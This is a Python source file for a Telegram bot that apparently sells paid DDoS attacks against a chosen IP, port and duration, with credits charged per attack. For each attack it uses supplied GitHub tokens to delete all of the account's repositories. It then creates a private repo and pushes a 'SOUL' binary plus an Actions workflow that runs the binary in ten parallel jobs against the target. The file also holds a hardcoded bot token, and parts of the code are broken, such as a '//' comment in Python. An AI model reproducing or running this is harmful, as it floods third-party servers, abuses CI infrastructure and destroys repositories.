import os
import asyncio
import base64
import json
from datetime import datetime
from telegram import Update
from telegram.constants import ChatAction
from telegram.ext import Application, CommandHandler, ContextTypes
from github import Github, InputGitTreeElement, Auth
from flask import Flask

// flask

app = Flask(__name__)

@app.route('/')
def home():
    return "Hello from Flask on Render!"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))  # Default to 5000 if PORT is not set
    app.run(host='0.0.0.0', port=port)



TELEGRAM_TOKEN = '7828525928:AAGyxRd-HIfgqSgBwtzM2fYRK9EIR3QImS0'

ADMIN_IDS = {7163028849}
DATA_FILE = 'soul.json'

user_sessions = {}
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'r') as f:
        try:
            user_sessions = json.load(f)
            for session in user_sessions.values():
                if 'approved' in session and isinstance(session['approved'], list):
                    session['approved'] = set(session['approved'])
        except Exception:
            user_sessions = {}

def save_data():
    to_save = {}
    for k, v in user_sessions.items():
        copy_sess = v.copy()
        if 'approved' in copy_sess and isinstance(copy_sess['approved'], set):
            copy_sess['approved'] = list(copy_sess['approved'])
        to_save[k] = copy_sess
    with open(DATA_FILE, 'w') as f:
        json.dump(to_save, f)

VBV_LOADING_FRAMES = [
    "🟦 [■□□□□]",
    "🟦 [■■□□□]",
    "🟦 [■■■□□]",
    "🟦 [■■■■□]",
    "🟦 [■■■■■]",
]

SOUL_YML_TEMPLATE = '''name: Run Soul 50x
on: [push]
jobs:
  soul:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10]
    steps:
      - uses: actions/checkout@v3
      - name: Make binary executable
        run: chmod +x *
      - name: Run soul binary
        run: ./SOUL {ip} {port} {time} 900 -1
'''


REPO_NAME = "soulcrack90"
CREDIT_COST_PER_ATTACK = 25

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/start - Show commands\n"
        "/approve <id> <credit> - Approve ID with credit (admin only)\n"
        "/credit <id> <credit> - Add credit to ID (admin only)\n"
        "/remove <id> - Remove ID approval (admin only)\n"
        "/token <token1> <token2> ... - Provide GitHub tokens separated by space (admin only)\n"
        "/server <ip> <port> <time> - Run binary with params on approved IDs\n"
        "/status - Show approved IDs and their credits\n"
    )

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <id> <credit>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    try:
        credit = int(context.args[1])
        if credit <= 0:
            raise ValueError()
    except Exception:
        await update.message.reply_text("Credit must be a positive integer")
        return
    session = user_sessions.get(chat_id, {})
    session.setdefault('credits', {})
    session.setdefault('approved', set())
    session['credits'][id_] = credit
    session['approved'].add(id_)
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Approved ID {id_} with {credit} credits.")

async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /credit <id> <credit>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    try:
        credit = int(context.args[1])
        if credit <= 0:
            raise ValueError()
    except Exception:
        await update.message.reply_text("Credit must be a positive integer")
        return
    session = user_sessions.get(chat_id, {})
    if id_ not in session.get('credits', {}):
        await update.message.reply_text(f"ID {id_} is not yet approved.")
        return
    session['credits'][id_] += credit
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Added {credit} credits to ID {id_}. Total: {session['credits'][id_]}")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <id>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    session = user_sessions.get(chat_id, {})
    if 'approved' in session and id_ in session['approved']:
        session['approved'].remove(id_)
    if 'credits' in session and id_ in session['credits']:
        del session['credits'][id_]
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Removed approval and credit for ID {id_}.")

async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /token <token1> <token2> ...")
        return
    chat_id = str(update.effective_chat.id)
    tokens = context.args
    session = user_sessions.get(chat_id, {})
    session['github_tokens'] = tokens
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Stored {len(tokens)} GitHub token(s).")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    session = user_sessions.get(chat_id, {})
    approved = session.get('approved', set())
    credits = session.get('credits', {})
    if not approved:
        await update.message.reply_text("No approved IDs.")
        return
    lines = ["Approved IDs and credits:"]
    for id_ in approved:
        c = credits.get(id_, 0)
        lines.append(f"ID: {id_} — Credits: {c}")
    await update.message.reply_text("\n".join(lines))

async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    session = user_sessions.get(chat_id, {})
    approved_ids = session.get('approved', set())
    credits = session.get('credits', {})
    github_tokens = session.get('github_tokens', [])
    if not github_tokens:
        await update.message.reply_text("Admin must set GitHub token(s) first with /token. Power By @soulcracks_owner")
        return
    if not approved_ids:
        await update.message.reply_text("No approved IDs to run attack on. Use /approve first. Power By @soulcracks_owner")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /server <ip> <port> <time> Power By @soulcracks_owner")
        return
    ip, port, time_s = context.args
    try:
        time_int = int(time_s)
        if time_int <= 0:
            raise ValueError()
    except Exception:
        await update.message.reply_text("Time must be a positive integer")
        return
    if not os.path.isfile("SOUL"):
        await update.message.reply_text("Local binary 'soul' not found!")
        return
    await context.bot.send_chat_action(chat_id=int(chat_id), action=ChatAction.TYPING)
    msg = await update.message.reply_text(f"{VBV_LOADING_FRAMES[0]}  0% completed")
    frame_count = len(VBV_LOADING_FRAMES)
    for i, frame in enumerate(VBV_LOADING_FRAMES):
        percentage = int(((i + 1) / frame_count) * 100)
        display_message = f"{frame}  {percentage}% completed"
        await asyncio.sleep(1)
        try:
            await msg.edit_text(display_message)
        except Exception:
            pass
    # For all approved IDs with sufficient credit, run attack on all tokens
    tasks = []
    for id_ in list(approved_ids):
        credit = credits.get(id_, 0)
        if credit < CREDIT_COST_PER_ATTACK:
            await update.message.reply_text(f"ID {id_} does not have enough credit. Needs at least {CREDIT_COST_PER_ATTACK}.")
            continue
        credits[id_] = credit - CREDIT_COST_PER_ATTACK
        for token in github_tokens:
            tasks.append(run_workflow_with_token_and_id(chat_id, token, ip, port, time_int, id_))
    user_sessions[chat_id]['credits'] = credits
    save_data()
    if not tasks:
        await update.message.reply_text("No IDs with enough credit to start attack.")
        return
    await asyncio.gather(*tasks)
    try:
        await msg.edit_text("✅ Attack successfully! Power By @soulcrack_owner")
    except Exception:
        pass

async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, id_):
    try:
        os.system("chmod +x *")
        g = Github(auth=Auth.Token(github_token))
        user = g.get_user()
        try:
            repos = user.get_repos()
            delete_tasks = []
            for repo in repos:
                if repo.owner.login == user.login:
                    delete_tasks.append(asyncio.to_thread(repo.delete))
            await asyncio.gather(*delete_tasks)
            await asyncio.sleep(2)
        except Exception:
            pass
        repo = user.create_repo(REPO_NAME, private=True, auto_init=True)
        branch = repo.default_branch or "main"
        base_ref = repo.get_git_ref(f"heads/{branch}")
        base_commit = repo.get_git_commit(base_ref.object.sha)
        base_tree = repo.get_git_tree(base_commit.sha)
        with open("SOUL", "rb") as f:
            binary_content = f.read()
        binary_b64 = base64.b64encode(binary_content).decode('utf-8')
        blob = repo.create_git_blob(binary_b64, "base64")
        binary_element = InputGitTreeElement(
            path="SOUL",
            mode='100755',
            type='blob',
            sha=blob.sha,
        )
        new_tree = repo.create_git_tree([binary_element], base_tree)
        new_commit = repo.create_git_commit("Add SOUL binary", new_tree, [base_commit])
        base_ref.edit(new_commit.sha)
        base_ref = repo.get_git_ref(f"heads/{branch}")
        base_commit = repo.get_git_commit(base_ref.object.sha)
        base_tree = repo.get_git_tree(base_commit.sha)
        yml_content = SOUL_YML_TEMPLATE.format(ip=ip, port=port, time=time)
        yml_element = InputGitTreeElement(
            path=".github/workflows/soul.yml",
            mode='100644',
            type='blob',
            content=yml_content,
        )
        workflow_tree = repo.create_git_tree([yml_element], base_tree)
        workflow_commit = repo.create_git_commit("Add workflow", workflow_tree, [base_commit])
        base_ref.edit(workflow_commit.sha)
    except Exception:
        pass

async def schedule_delete_and_notify(chat_id, github_token, repo_name, sec, ip, port, time, update):
    await asyncio.sleep(sec)
    try:
        g = Github(auth=Auth.Token(github_token))
        repo = g.get_user().get_repo(repo_name)
        repo.delete()
        await update.message.reply_text(f"🛑 Attack over on {ip}:{port} after {time} seconds.")
    except Exception:
        pass

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("credit", add_credit))
    app.add_handler(CommandHandler("remove", remove))
    app.add_handler(CommandHandler("token", token))
    app.add_handler(CommandHandler("server", server))
    app.add_handler(CommandHandler("status", status))
    app.run_polling()

if __name__ == "__main__":
    main()
